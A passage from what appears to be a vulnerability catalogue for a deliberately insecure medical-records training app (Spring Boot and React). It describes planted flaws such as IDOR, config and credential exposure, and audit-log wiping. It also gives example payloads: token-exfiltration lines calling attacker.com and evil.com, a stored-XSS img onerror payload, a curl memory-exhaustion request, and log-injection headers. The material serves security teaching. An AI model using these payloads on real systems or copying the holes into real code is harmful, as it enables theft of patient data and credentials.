{"username":"attacker","email":"att@evil.com","password":"pass","role":"ADMIN"}
```
Since `/api/admin/**` is `permitAll()`, the attacker does not need an existing ADMIN session. One unauthenticated request yields a permanent privileged account.

---

**64. Sensitive Data Exposure — GET /api/admin/config returns raw Environment [A04] — `AdminService.java`**
```java
// [A04] Iterates all EnumerablePropertySource instances — includes application.yaml,
//        OS environment variables, and JVM system properties
environment.getPropertySources().stream()
        .filter(ps -> ps instanceof EnumerablePropertySource)
        .map(ps -> (EnumerablePropertySource<?>) ps)
        .forEach(ps -> Arrays.stream(ps.getPropertyNames())
                .forEach(name -> props.put(name, ps.getProperty(name))));
```
All values are returned as plain text with **no redaction**. Exposed secrets include:

| Property | Value example |
|---|---|
| `spring.datasource.password` | `root` |
| `spring.datasource.url` | `jdbc:mysql://localhost:3306/mediconnect_db` |
| Any OS env var | `DB_PASS`, `JWT_SECRET`, `CLOUD_API_KEY` |

Unlike `/actuator/env` (which masks values with `"******"`), this endpoint returns the actual plaintext values.

---

**65. Security Logging Failure — POST /api/admin/logs/clear destroys audit trail [A09] — `AdminService.java`**
```java
// [A09] Hard delete — no soft-delete, no archive, no immutable backup
long count = auditLogRepository.count();
auditLogRepository.deleteAll();   // permanent, irreversible
```
Impact:
- All evidence of unauthorized access (IDOR reads, role escalation) is permanently destroyed
- HIPAA / GDPR-mandated access logs for medical record reads are erased
- Forensic timeline required for incident response is gone

Attack chain:
1. Exploit IDOR endpoints to harvest patient records and escalate own role to ADMIN
2. `POST /api/admin/logs/clear` → wipe all evidence in a single request
3. Security team finds no log data — the breach is completely undetectable

No role check, no supervisor approval, no immutable audit sink. A PATIENT can call this endpoint.

---

---

## Logging Interceptor — `LoggingInterceptor`, `RequestCachingFilter`, `WebMvcConfig`

### New Files

| File | Description |
|---|---|
| `interceptor/LoggingInterceptor.java` | `HandlerInterceptor` — logs IP, method, URI, params, request/response body, User-Agent, stack trace to `audit_logs` |
| `interceptor/RequestCachingFilter.java` | `OncePerRequestFilter` — wraps every request/response with `ContentCachingRequestWrapper` / `ContentCachingResponseWrapper` so body bytes can be read after Spring MVC consumes them |
| `config/WebMvcConfig.java` | `WebMvcConfigurer` — registers the interceptor on `/**` and the caching filter at order 1 |

### Vulnerabilities

**66. Information Exposure Through Error Message — ex.printStackTrace(pw) [A08 / CWE-209] — `LoggingInterceptor.java`**
```java
if (ex != null) {
    StringWriter sw = new StringWriter();
    PrintWriter pw = new PrintWriter(sw);
    ex.printStackTrace(pw);           // [A08] full JVM stack trace captured
    details.put("stackTrace", sw.toString());  // persisted to audit_logs.details
}
```
The full stack trace is stored in `audit_logs.details` and readable by any caller via `GET /api/admin/logs` (no role check). Exposed information:
- Internal class names and package structure (`com.mediconnect.service.UserService.findById`)
- Framework versions (Spring 3.5.14, Hibernate, Tomcat)
- SQL query text from `JpaSystemException` / `DataAccessException`
- File paths from `IOException` (e.g., `/tmp/mediconnect/uploads/`)
- Full dependency call chain — maps the exact internal architecture for an attacker

---

**67. Sensitive parameters logged without masking [A04 / A09] — `LoggingInterceptor.java`**
```java
// [A06][A09] No redaction of password, token, secret, or key fields
Map<String, String[]> paramMap = request.getParameterMap();
String params = paramMap.entrySet().stream()
        .map(e -> e.getKey() + "=" + String.join(",", e.getValue()))
        .collect(Collectors.joining("; "));
// Stored: params=username=admin; password=secret123;
```
Request body also logged verbatim:
```java
requestBody = new String(ccr.getContentAsByteArray(), StandardCharsets.UTF_8);
// Stored: {"username":"admin","password":"secret123"}  ← plaintext credential in DB
```
Every login attempt ever made through the API is recorded as plaintext in `audit_logs`. A single SQL read on a compromised database yields credentials for every user.

---

**68. Log Injection via unsanitized User-Agent [A05 / CWE-117] — `LoggingInterceptor.java`**
```java
// [A05] No CR/LF stripping before persistence
String userAgent = request.getHeader("User-Agent");  // stored verbatim
```
Attack — inject a fake audit record by crafting the User-Agent header:
```
User-Agent: Mozilla/5.0\r\nACTION: admin granted ADMIN role to user 99
```
When the `audit_logs` table is exported to a SIEM, flat-file log, or CSV report, the injected `\r\n` creates a new line that appears as a legitimate audit event, corrupting the security timeline and enabling an attacker to forge their own alibi or frame another user.

---

**69. Spoofable IP address via X-Forwarded-For [A06] — `LoggingInterceptor.java`**
```java
// [A06] X-Forwarded-For header trusted without validation
String ip = request.getHeader("X-Forwarded-For");
if (ip == null || ip.isBlank()) ip = request.getRemoteAddr();
// Stored verbatim in audit_logs.ip_address
```
An attacker sends `X-Forwarded-For: 127.0.0.1` and their real IP is never recorded. All audit records show `127.0.0.1` as the source, making forensic attribution impossible.

---

**70. Response body logged verbatim — JWT and passwordHash duplicated in audit table [A06] — `LoggingInterceptor.java`**
```java
// [A06] Response body stored in audit_logs — may contain JWT tokens or password hashes
responseBody = new String(ccr.getContentAsByteArray(), StandardCharsets.UTF_8);
// GET /api/users/1 response: {"id":1,"passwordHash":"5f4dcc3b...","role":"ADMIN"}
// POST /api/auth/login response: {"token":"eyJhbGciOiJ..."}
// → both are persisted to audit_logs.details
```
The audit table becomes a secondary credential store. Any SQL injection or database breach that reaches `audit_logs` also yields JWT tokens (valid for 30 days) and MD5 password hashes for every request ever logged.

---

---

## Global Exception Handler — `GlobalExceptionHandler`, `EntityNotFoundException`

### New Files

| File | Description |
|---|---|
| `exception/EntityNotFoundException.java` | Custom `RuntimeException` carrying `id` (Long) and `tableName` (String) |
| `exception/GlobalExceptionHandler.java` | `@RestControllerAdvice` — forwards raw exception messages and type names to the client |

### Vulnerabilities

**71. Internal error messages forwarded to client [A04] — `GlobalExceptionHandler.java`**
```java
// [A04] Raw exception message forwarded verbatim — no sanitization, no generic fallback
@ExceptionHandler(RuntimeException.class)
public ResponseEntity<Map<String, Object>> handleRuntime(RuntimeException ex) {
    body.put("error", ex.getMessage());        // internal service message
    body.put("type",  ex.getClass().getName()); // fully-qualified class name
    ...
}
```
Internal messages exposed through this handler:

| Source | Message forwarded |
|---|---|
| `AuthService` | `"User not found: admin"` — username enumeration |
| `AuthService` | `"Invalid password"` — confirms account exists |
| `AuthService` | `"Account is locked until 2026-05-10T22:00"` — timing oracle |
| `UserService` | `"User not found: 5"` — sequential ID leak |
| `Role.valueOf()` | `"No enum constant com.mediconnect.enums.Role.SUPERADMIN"` — full package path |
| Hibernate constraint | raw SQL column / index names in violation messages |

The `type` field additionally reveals the fully-qualified class name (e.g. `com.mediconnect.service.UserService`), mapping the internal package structure for an attacker.

---

**72. DB table name and PK exposed on 404 [A04] — `GlobalExceptionHandler.java`, `EntityNotFoundException.java`**
```java
// EntityNotFoundException — carries raw persistence details
super("Entity with ID " + id + " not found in table " + tableName);

// GlobalExceptionHandler response:
body.put("error", ex.getMessage()); // "Entity with ID 99 not found in table medical_records"
body.put("id",    ex.getId());      // 99
body.put("table", ex.getTableName()); // "medical_records"
```
Example API response:
```json
GET /api/medical-records/99
→ 404 {
    "error": "Entity with ID 99 not found in table medical_records",
    "id": 99,
    "table": "medical_records",
    "timestamp": "2026-05-10T22:30:00"
  }
```
An attacker learns the exact table name, enabling targeted SQL injection payload construction. Sequential ID enumeration is confirmed by observing which IDs return 404 vs. 200.

---

**73. JVM-level error forwarded to client [A04] — `GlobalExceptionHandler.java`**
```java
@ExceptionHandler(Throwable.class)
public ResponseEntity<Map<String, Object>> handleThrowable(Throwable ex) {
    body.put("error", ex.getMessage());         // e.g. "Java heap space"
    body.put("type",  ex.getClass().getName()); // "java.lang.OutOfMemoryError"
    ...
}
```
If `ContentCachingFilter` triggers an `OutOfMemoryError` (see vulnerability 74), this handler catches it and returns `{"type":"java.lang.OutOfMemoryError","error":"Java heap space"}` — confirming to the attacker that the DoS payload succeeded and the exact JVM failure mode.

---

## Content Caching Filter — `ContentCachingFilter`

### New Files

| File | Description |
|---|---|
| `interceptor/ContentCachingFilter.java` | `@Component` `Filter` — wraps every request/response with `ContentCachingRequestWrapper` / `ContentCachingResponseWrapper` without any size limit |

### Changes

- `config/WebMvcConfig.java` — removed manual `FilterRegistrationBean<RequestCachingFilter>`; body buffering now handled by `ContentCachingFilter` (`@Order(1)`)
- `src/main/resources/application.yaml` — added `spring.servlet.multipart.max-file-size: -1` and `max-request-size: -1`

### Vulnerabilities

**74. Unbounded memory buffering — ContentCachingRequestWrapper without size limit [A08 / CWE-400] — `ContentCachingFilter.java`**
```java
// [A08] Single-argument constructor — no contentCacheLimit, no upper bound
ContentCachingRequestWrapper cachedRequest = new ContentCachingRequestWrapper(httpRequest);
```
`ContentCachingRequestWrapper(HttpServletRequest)` reads the full request body into a `byte[]` on the JVM heap. Combined with unlimited multipart settings:
```yaml
# application.yaml
spring.servlet.multipart.max-file-size: -1    # [A08] no file-size ceiling
spring.servlet.multipart.max-request-size: -1 # [A08] no request-size ceiling
```
Attack — single HTTP request causes Denial of Service:
```bash
curl -X POST https://api.mediconnect.com/api/medical-records/1/attachment \
     -F "file=@/dev/urandom" \   # infinite random byte stream
     -H "Transfer-Encoding: chunked"
```
The JVM allocates heap until `java.lang.OutOfMemoryError: Java heap space` is thrown, taking the entire application offline. No authentication required (SecurityConfig `permitAll()`).

Secure fix:
```java
// Two-argument constructor with a reasonable cap
new ContentCachingRequestWrapper(request, 64 * 1024);  // 64 KB
```
```yaml
spring.servlet.multipart.max-file-size: 10MB
spring.servlet.multipart.max-request-size: 15MB
```

---

**75. Response body buffered without limit [A08 / CWE-400] — `ContentCachingFilter.java`**
```java
// [A08] Entire response body held in heap simultaneously with the controller's output
ContentCachingResponseWrapper cachedResponse = new ContentCachingResponseWrapper(httpResponse);
```
A large `GET /api/users` response returning 50 000 records is held in heap twice: once by the JPA result set and once by the wrapper. Combined with a large request body in the same request, effective heap pressure is doubled.

---

## Frontend Vulnerabilities — `mediconnect-frontend` (React 18 + TypeScript + Vite)

> **UI theme**: Dark industrial IoT dashboard — `#0D1117` background, `#2F81F7` electric blue accent,
> sharp 4 px border-radius, monospace fonts for numeric values, zebra-stripped tables,
> colored status dots, dense information layout. All vulnerabilities remain unchanged.

---

**76. JWT stored in localStorage [A04 / CWE-922] — `AuthContext.tsx`**
```typescript
// [A06] VULNERABLE: storing JWT in localStorage — accessible to any JS on this origin
localStorage.setItem('token', data.token)
localStorage.setItem('user', JSON.stringify(data.user))  // includes passwordHash
```
Any XSS payload (`<script>`, injected `img onerror`, stored XSS from MessageController) can exfiltrate the JWT with a single `fetch('https://attacker.com/?t=' + localStorage.getItem('token'))`. `httpOnly` cookies would prevent this; localStorage has no browser protection.

---

**77. Client-side JWT decode without signature verification [A04 / CWE-345] — `AuthContext.tsx`**
```typescript
function decodeJwtPayload(token: string): Record<string, unknown> {
  const base64Payload = token.split('.')[1]
  const json = atob(base64Payload.replace(/-/g, '+').replace(/_/g, '/'))
  return JSON.parse(json)  // signature (.split('.')[2]) is never checked
}
// role field trusted from the decoded payload:
role: (payload['role'] as string) ?? data.user.role,
```
An attacker who intercepts or crafts a token can change `role` to `ADMIN` in the payload. Because the signature is never verified client-side, the frontend grants ADMIN access. The backend's weak JWT secret (30-char static string in `JwtUtil.java`) makes forging signatures trivially easy too.

---

**78. Client-side role-based access control [A01 / CWE-602] — `ProtectedRoute.tsx`**
```typescript
// [A06] Role read from locally-decoded JWT payload stored in state —
// signature was never verified (see AuthContext.tsx decodeJwtPayload)
const userRole = user?.role ?? ''
if (userRole !== requiredRole) {
  return <Navigate to="/dashboard" replace />
}
```
Setting `localStorage.setItem('user', JSON.stringify({...JSON.parse(localStorage.getItem('user')), role: 'ADMIN'}))` in the browser console bypasses every route guard. Backend endpoints (AdminController, etc.) do not consistently enforce role checks either, completing the A01 chain.

---

**79. Full user object (including passwordHash) persisted in localStorage [A02 / CWE-312] — `AuthContext.tsx`**
```typescript
// [A06] Full user object (including passwordHash from server) stored in localStorage
localStorage.setItem('user', JSON.stringify(data.user))
```
The backend `UserService.toDto()` intentionally includes `passwordHash` in the response DTO (vulnerability #4). This hash is now stored in plaintext browser storage, readable via `JSON.parse(localStorage.getItem('user')).passwordHash`.

---

**80. Raw server error message rendered directly in UI [A04] — `LoginPage.tsx`**
```typescript
// [A04] Raw server error message rendered directly into the DOM
const message =
  (err as { response?: { data?: { error?: string } } })?.response?.data?.error ?? 'Login failed'
setError(message)
```
`GlobalExceptionHandler.java` leaks internal exception class names, DB table names, and raw PKs. These strings are forwarded verbatim to the browser and rendered as visible error messages, helping attackers enumerate the system.

---

**81. Token read from localStorage injected into every HTTP request [A04 / A07] — `axiosInstance.ts`**
```typescript
// [A06] Insecure Design — token pulled directly from localStorage
const token = localStorage.getItem('token')
if (token) {
  config.headers.Authorization = `Bearer ${token}`
}
```
Axios interceptor reads localStorage synchronously on every request, meaning a token injected by an XSS payload is immediately used for authenticated API calls on behalf of the victim.

---

**82. passwordHash column displayed in admin table [A04] — `DashboardPage.tsx`**
```typescript
{/* [A04] passwordHash rendered in plaintext */}
<td className="py-2 font-mono text-xs break-all">{u.passwordHash ?? '—'}</td>
```
The admin dashboard renders every user's MD5 password hash (already crackable offline) directly in the browser DOM. Combined with the `GET /api/admin/users` endpoint having no ADMIN role check (vulnerability #62), any authenticated user can access this view.

---

**83. localStorage JWT visible in Token Inspector widget [A06] — `DashboardPage.tsx`**
```typescript
{localStorage.getItem('token') ?? 'No token found'}
```
The dashboard intentionally exposes the raw JWT in the UI as a teaching aid, reinforcing that localStorage is fully readable by JavaScript (and thus by any XSS payload on the same origin).

---

**84. dangerouslySetInnerHTML — Stored XSS in message rendering [A05 / CWE-79] — `MessagesPage.tsx`**
```typescript
// [A05] VULNERABLE: Stored XSS — message.content rendered as raw HTML
// Attack: POST /api/messages content: <img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('token'))">
<div dangerouslySetInnerHTML={{ __html: msg.content }} />
```
The message thread renders `content` from the database as raw HTML without sanitization. An attacker who sends a crafted message can execute arbitrary JavaScript in every recipient's browser. Combined with the localStorage JWT storage (vulnerability #76), the XSS payload can immediately exfiltrate the session token. The Compose dialog explicitly invites users to test the payload `<img src=x onerror="alert(1)">`.

---

**85. JWT token embedded as URL query parameter [A04 / CWE-598] — `ProfilePage.tsx`**
```typescript
// [A06] VULNERABLE: JWT in URL — visible in browser history, server access logs,
// CDN logs, and Referer headers when the user navigates away
const exportPdfUrl = `/api/users/${user?.id}/export?format=pdf&token=${token}`
window.open(exportPdfUrl, '_blank')

const shareReportUrl = `${window.location.origin}/view-report?patientId=${user?.id}&accessToken=${token}&format=json`
```
Two export flows embed the full JWT in URL query parameters. Risks: (1) URL appears in browser history — extractable by any local user; (2) URL sent in `Referer` header to any linked resource on the target page; (3) URL logged verbatim by web servers, load balancers, and CDNs; (4) URL visible to any third-party script on the page via `window.location`. The Profile page displays both URLs to make the vulnerability observable.

---

**86. Admin page accessible to all authenticated users — no role guard [A01 / CWE-285] — `App.tsx` + `AdminPage.tsx`**
```typescript
// [A01] ProtectedRoute used WITHOUT requiredRole="ADMIN"
// Any authenticated user reaches AdminPage
<Route path="/admin" element={<ProtectedRoute><AdminPage /></ProtectedRoute>} />

// AdminPage loads all users with password hashes for every authenticated caller:
const { data } = await api.get<User[]>('/admin/users')  // no ADMIN check on backend either
```
The `/admin` route uses `ProtectedRoute` without `requiredRole`, so any logged-in user (PATIENT, DOCTOR, etc.) can navigate to the admin panel. The backend `AdminController.getAllUsers()` also has no `@PreAuthorize` annotation. The combination gives any authenticated user: full user list with MD5 password hashes, ability to change any user's role (instant privilege escalation), access to all environment variables including DB password, and ability to destroy the audit trail.

---

**87. Role change via Mass Assignment in Admin UI [A07 / CWE-915] — `AdminPage.tsx`**
```typescript
// [A07] Role sent from client-controlled select — backend accepts it verbatim
api.put(`/users/${id}/role`, { role })  // role is user-selected, e.g. "ADMIN"
```
The Admin panel allows any authenticated user to promote any other user (including themselves) to ADMIN by selecting from a dropdown and clicking "Update Role". The backend `UserController.updateRole()` reads `role` directly from the request body without authorization checks.

---

**88. Sender ID spoofing in message compose form [A07 / CWE-284] — `MessagesPage.tsx`**
```typescript
// [A07] senderId is an editable numeric field in the compose form
// Backend MessageService.sendMessage() trusts the body's senderId instead of reading from JWT
api.post('/messages', { senderId: editableNumber, receiverId: ..., content: ... })
```
The compose dialog exposes `senderId` as an editable input field. Any user can set it to any numeric ID to impersonate another user. The backend `MessageService` stores `senderId` from the request body rather than extracting it from the authenticated JWT subject.

---

## Patient Controller — `PatientController`, `PatientService`

### New Files

| File | Description |
|---|---|
| `controller/PatientController.java` | `GET /api/patients/by-user/{userId}` |
| `service/PatientService.java` | `findByUserId` — resolves a patient record by user ID |

### Vulnerabilities

**89. IDOR — GET /api/patients/by-user/{userId} exposes full PII without ownership check [A01] — `PatientController.java`**
```java
// [A01] No comparison of userId against the authenticated principal from the JWT
@GetMapping("/by-user/{userId}")
public ResponseEntity<PatientDto> getByUserId(@PathVariable Long userId) {
    return patientService.findByUserId(userId)
            .map(ResponseEntity::ok)
            .orElse(ResponseEntity.notFound().build());
}
```
Any caller — unauthenticated, DOCTOR, or PHARMACIST — can retrieve the full patient profile of any user:
- `insuranceNumber` — insurance identifier
- `dateOfBirth` — date of birth
- `bloodType` — blood type
- `allergies` — allergy list
- `emergencyContact` — emergency contact details

By iterating `userId` values (`/api/patients/by-user/1`, `/2`, `/3`...) an attacker harvests the complete PII dataset for all patients in the system.

---

## Stats Controller — `StatsController`, `StatsService`

### New Files

| File | Description |
|---|---|
| `controller/StatsController.java` | `GET /api/stats/summary`, `GET /api/stats/charts` |
| `service/StatsService.java` | Aggregates counts from all repositories — users by role, appointments by status/month, lab results by status, messages per day |

### Vulnerabilities

**90. Broken Access Control — GET /api/stats/summary with no role check [A01] — `StatsController.java`**
```java
// [A01] No @PreAuthorize, no manual role check — combined with SecurityConfig.permitAll()
//        any unauthenticated caller receives aggregate system statistics
@GetMapping("/summary")
public ResponseEntity<Map<String, Object>> summary() {
    return ResponseEntity.ok(statsService.getSummary());
}
```
A PATIENT, an unauthenticated attacker, or a crawler receives:
- Total number of registered users split by role (`ADMIN`, `DOCTOR`, `PATIENT`, `LAB_TECH`, `PHARMACIST`)
- Total appointments and breakdown by status
- Number of appointments scheduled for today
- Total lab results and breakdown by status
- Counts for messages, medical records, and prescriptions

This lets an attacker estimate the scale of the database, confirm how many administrative accounts exist, and monitor appointment load — all without a valid token.

---

**91. Broken Access Control — GET /api/stats/charts with no role check [A01] — `StatsController.java`**
```java
// [A01] Same permitAll() exposure as /summary
@GetMapping("/charts")
public ResponseEntity<Map<String, Object>> charts() {
    return ResponseEntity.ok(statsService.getCharts());
}
```
An unauthenticated caller receives:
- Appointment volume trend for the last 6 months (from `requestedDate` timestamps)
- Appointment status distribution across all patients
- Daily message volume for the last 7 days

Message volume patterns reveal peak usage hours; combined with `GET /api/messages/conversation/{userId}` (vulnerability #57), the attacker can time data harvesting requests to periods of low monitoring activity.

---

## New Endpoints — Session 2 (functional improvements)

The following endpoints were added to support the appointment detail/edit modal, medical records list, conversations list, and profile update. All carry intentional [A01] vulnerabilities consistent with the rest of the branch.

---

### `PUT /api/appointments/{id}` — `AppointmentController`, `AppointmentService`

**92. IDOR — PUT /api/appointments/{id} without ownership check [A01] — `AppointmentController.java`**
```java
// [A01] No check that the caller is the patient or doctor on this appointment
@PutMapping("/{id}")
public ResponseEntity<?> updateAppointment(@PathVariable Long id, @RequestBody AppointmentDto dto) {
    return ResponseEntity.ok(appointmentService.update(id, dto));
}
```
Any authenticated (or unauthenticated, given `permitAll()`) caller can modify the `requestedDate`, `notes`, and `status` of any appointment by supplying its ID. No comparison is made between the appointment's `patient_id` / `doctor_id` and the identity in the JWT token.

---

### `GET /api/medical-records` — `MedicalRecordController`, `MedicalRecordService`

**93. Broken Access Control — GET /api/medical-records returns all records to all roles [A01] — `MedicalRecordController.java`**
```java
// [A01] No caller identity check — full cross-patient exposure
@GetMapping
public ResponseEntity<List<MedicalRecordDto>> getAll() {
    return ResponseEntity.ok(medicalRecordService.findAll());
}
```
Every medical record in the database — diagnosis, notes/prescription text, attachment path, patient name — is returned to any caller without checking role or ownership. A PHARMACIST, LAB_TECH, or unauthenticated attacker can harvest the complete medical history of all patients with a single request.

---

### `GET /api/messages/conversations?userId=` — `MessageController`, `MessageService`

**94. IDOR — GET /api/messages/conversations userId parameter not verified against JWT [A01] — `MessageController.java`**
```java
// [A01] userId is a query parameter — never compared to the authenticated principal
@GetMapping("/conversations")
public ResponseEntity<List<ConversationDto>> getConversations(@RequestParam Long userId) {
    return ResponseEntity.ok(messageService.getConversations(userId));
}
```
A caller can supply any `userId` to retrieve another user's full conversation list, including partner emails, last-message previews, and unread counts. No ownership verification is performed.

---

### `PUT /api/users/{id}` — `UserController`, `UserService`

**95. IDOR — PUT /api/users/{id} updates any user's profile without ownership check [A01] — `UserController.java`**
```java
// [A01] Any caller can update any user's profile — no comparison of {id} against JWT subject
@PutMapping("/{id}")
public ResponseEntity<UserDto> updateUser(@PathVariable Long id, @RequestBody UserDto dto) {
    return ResponseEntity.ok(userService.update(id, dto));
}
```
Patient A can update Patient B's email address by calling `PUT /api/users/2` with a crafted body. The endpoint is also reachable without any JWT (SecurityConfig `permitAll()`).

---

### V11 + V12 Flyway Migrations — extended seed data

**96. MD5 seed passwords without salt — V11 and V12 [A04]**

V11 (`V11__extended_seed_data.sql`) and V12 (`V12__rich_seed_data.sql`) insert 8 additional user accounts (patient2, patient3, doctor2, doctor3, labtech1, pharmacist1 and their associated role records). All passwords are hashed with unsalted MD5:

| Username | Password | MD5 hash |
|---|---|---|
| `patient2` | `patient123` | `0d107d09f5bbe40cade3de5c71e9e9b7` |
| `patient3` | `patient123` | `0d107d09f5bbe40cade3de5c71e9e9b7` |
| `doctor2`  | `doctor123`  | `9c42a1346e333a770904b2a2b37fa7d3` |
| `doctor3`  | `doctor123`  | `9c42a1346e333a770904b2a2b37fa7d3` |
| `labtech1` | `labtech123` | `b4a01e79eee4e7a2a4ae1e2a0e0c2e57` |
| `pharmacist1` | `pharma123` | `35e1e28f6289c6e07c68cb4c15a57e84` |

All values are recoverable via public rainbow tables. The seed also inserts 35+ additional records across appointments, lab results, prescriptions, and messages — all with PII stored as plaintext per V2 schema ([A06]).

---

---

## Dashboard Page — Improvements (Session 3)

### Backend — `StatsController`, `StatsService`, `RecentEventDto`

**97. Broken Access Control — GET /api/stats/recent returns all users' activity with no auth filter [A05] — `StatsController.java`, `StatsService.java`**
```java
// [A05] No authentication or authorization check — any caller can retrieve all users' activity.
@GetMapping("/recent")
public ResponseEntity<List<RecentEventDto>> recent() {
    return ResponseEntity.ok(statsService.getRecent());
}
```
`StatsService.getRecent()` performs a UNION across appointments, lab results, messages, and prescriptions — returning the 10 most recent events from all users. No ownership filter, no role check. An unauthenticated attacker can observe:
- Appointment events: which patients visited which doctors and when
- Lab result events: which tests were ordered for which patients
- Message events: who communicated with whom (sender + receiver emails)
- Prescription events: which medications were prescribed to which patients

---

**98. Extended summary exposes system-wide unread message count [A05] — `StatsService.getSummary()`**
```java
// [A05] Counts unread messages system-wide — no ownership filter
long unreadMessages = messageRepository.findAll().stream()
    .filter(m -> m.getReadAt() == null)
    .count();
summary.put("unreadMessages", unreadMessages);
```
`GET /api/stats/summary` now returns `unreadMessages` (count of all unread messages in the entire system, regardless of sender/receiver). Any caller — including unauthenticated ones — learns the global unread volume, which can be combined with `GET /api/messages/conversation` IDOR (vuln #57) to time harvesting attacks.

---

### Frontend — `DashboardPage.tsx`, `Sidebar.tsx`

**99. [A06] Role-aware greeting banner exposes user ID in plaintext — `DashboardPage.tsx`**
```typescript
// [A06] User ID exposed in UI — IDOR enumeration aid
<span className="text-[#F85149]">[A06]</span>{' '}
Logged in as user #{user?.id ?? '—'}
```
The greeting banner renders the authenticated user's database primary key (e.g. `Logged in as user #2`) in the UI. An attacker can cross-reference this ID with IDOR endpoints such as `GET /api/users/{id}`, `GET /api/patients/by-user/{id}`, and `PUT /api/users/{id}` to construct targeted attacks without enumeration.

---

**100. [A05] Recent activity feed renders all-users events client-side — `DashboardPage.tsx`**
```typescript
// [A05] /stats/recent returns all users' activity — no auth filter server-side
const { data: recentEvents = [] } = useQuery<RecentEvent[]>({
  queryKey: ['stats-recent'],
  queryFn: async () => {
    const { data } = await api.get<RecentEvent[]>('/stats/recent')
    return data
  },
})
```
The dashboard renders the last 10 events from `GET /api/stats/recent` for all authenticated users. A PATIENT user sees events from other patients' appointments, lab results, and prescriptions — cross-patient data exposure without any role or ownership check.

---

**101. [A01] Sidebar unread badge polls all conversations via userId query param — `Sidebar.tsx`**
```typescript
// [A01] userId passed as query param — server does not verify against JWT principal
const { data: conversations = [] } = useQuery<Conversation[]>({
  queryKey: ['conversations', user?.id],
  enabled: !!user?.id,
  refetchInterval: 30000,
  queryFn: async () => {
    const { data } = await api.get<Conversation[]>(`/messages/conversations?userId=${user!.id}`)
    return data
  },
})
```
The sidebar polls `GET /api/messages/conversations?userId=` every 30 seconds to show an unread message badge. The `userId` parameter is never verified server-side (vuln #94). An attacker who modifies the in-flight request (or directly calls the endpoint) can supply any `userId` to retrieve another user's unread conversation counts.

---

### Role-Based Dashboards (Session 4) — `DashboardPage.tsx`, `StaffDashboardPage.tsx`, `App.tsx`, `Sidebar.tsx`, `LabResultService.java`

**102. [A01] `/staff` route has no role guard — any authenticated user can access it — `App.tsx`**
```typescript
// [A01] /staff uses ProtectedRoute WITHOUT requiredRole — any authenticated user
// (including PATIENT) can navigate directly to /staff and see staff data.
<Route path="/staff" element={<ProtectedRoute><StaffDashboardPage /></ProtectedRoute>} />
```
The `/staff` route is protected only by authentication (JWT must be valid), not by role. A PATIENT who knows the URL can navigate to `/staff` and load the DOCTOR, LAB_TECH, or PHARMACIST dashboard views. The component renders a UI-only unauthorized warning, but the underlying API calls still execute and return data.

---

**103. [A01] Sidebar Dashboard link is role-aware client-side only — no server enforcement — `Sidebar.tsx`**
```typescript
// [A01] Dashboard path set client-side by role — no server enforcement.
//        A patient can still navigate directly to /staff or /admin.
const dashboardPath = user?.role === 'PATIENT' ? '/dashboard'
  : user?.role === 'ADMIN' ? '/admin'
  : '/staff'
```
The sidebar redirects each role to its intended dashboard path purely on the client. No server-side route guard or API authorization prevents a PATIENT from visiting `/staff` or `/admin` directly. The "access control" is a UI convenience, not a security boundary.

---

**104. [A01] Patient dashboard fetches all appointments — client-side filter only — `DashboardPage.tsx`**
```typescript
// [A01] Client-side filter — backend sends ALL patients' appointments; PATIENT sees them all in network tab
const myAppointments = appointments.filter(a => a.patientName === username)
```
`GET /api/appointments` returns every appointment in the system. The patient dashboard filters by `patientName === username` in the browser. The raw network response containing all other patients' appointment records (names, doctors, dates, statuses) is fully visible in the browser's DevTools Network tab.

---

**105. [A01] Doctor dashboard fetches all appointments — client-side filter — `StaffDashboardPage.tsx`**
```typescript
// [A01] Client-side filter — server sends all doctors' appointments; easily bypassed in browser
const myAppts = appointments.filter(a => a.doctorName === username)
```
Same pattern as #104 but for the doctor view. The doctor's browser receives every appointment in the system and filters by their own name. Removing or modifying the filter expression in DevTools reveals all other doctors' schedules.

---

**106. [A01] `GET /lab-results/search` with no patientId returns all patients' results — `LabResultService.java`**
```java
// [A01] null patientId → no filter → all patients' results exposed to any caller
(patientId != null ? "AND lr.patient_id = " + patientId : ""); // [A05] no quotes — UNION-ready
```
When `patientId` is omitted from the request, `searchLabResults()` no longer appends the `patient_id` filter clause, returning all lab results system-wide. The endpoint `GET /api/lab-results/search` has no role check — a PATIENT who navigates to `/staff` triggers `LabTechDashboard` which calls this endpoint with no `patientId`, exposing all patients' test names, values, and statuses.

---

---

**107. [A01] `PUT /api/medical-records/{id}` — no ownership check — `MedicalRecordController.java`, `MedicalRecordService.java`**
```java
// [A01] No ownership check — any authenticated user can update any medical record
@PutMapping("/{id}")
public ResponseEntity<MedicalRecordDto> updateRecord(@PathVariable Long id, @RequestBody MedicalRecordDto dto) {
    return ResponseEntity.ok(medicalRecordService.update(id, dto));
}
```
Any authenticated user (including a PATIENT) can send `PUT /api/medical-records/1` with a new diagnosis and notes, overwriting a record that belongs to any other patient. No check that `authentication.name` matches the record's patient or doctor.

---

**108. [A01] `PUT /api/prescriptions/{id}/dispense` — no pharmacist role check — `PrescriptionController.java`**
```java
// [A01] No role check — any caller (PATIENT, DOCTOR, LAB_TECH) can dispense
@PutMapping("/{id}/dispense")
public ResponseEntity<PrescriptionDto> dispense(@PathVariable Long id, @RequestBody Map<String, Long> body) {
    return ResponseEntity.ok(prescriptionService.dispense(id, body.get("pharmacistId")));
}
```
The dispense endpoint requires no `PHARMACIST` role. A PATIENT can call `PUT /api/prescriptions/5/dispense` and mark their own prescription as dispensed, bypassing pharmacy workflow.

---

**109. [A07] `pharmacistId` from request body — mass assignment — `PrescriptionController.java`**
```java
Long pharmacistId = body.get("pharmacistId");  // attacker-supplied, not from JWT
return ResponseEntity.ok(prescriptionService.dispense(id, pharmacistId));
```
The pharmacist identity recorded in the audit trail is taken from the request body, not from the authenticated session. Any caller can attribute a dispense action to any pharmacist user ID, forging the medication dispensing record.

---

**110. [A02] No state machine on dispense — double dispensing and void prescription dispensing — `PrescriptionService.java`**
```java
// [A02] No guard: DISPENSED → DISPENSED and CANCELLED → DISPENSED both allowed
prescription.setStatus(PrescriptionStatus.DISPENSED);
prescription.setPharmacistId(pharmacistId);
prescription.setDispensedAt(LocalDateTime.now());
```
The dispense method never checks the current status before transitioning. Allowed by the missing state machine: `DISPENSED → DISPENSED` (duplicate supply / billing fraud) and `CANCELLED → DISPENSED` (dispensing a voided prescription — pharmaceutical fraud).

---

**111. [A01] Edit button in Medical Records — no ownership check on server — `MedicalRecordsPage.tsx`**
```tsx
// Edit shown for all non-patient staff — but server does no ownership check on PUT /{id}
{!isPatient && (
  <Button size="sm" variant="outline" onClick={() => openEditModal(rec)}>
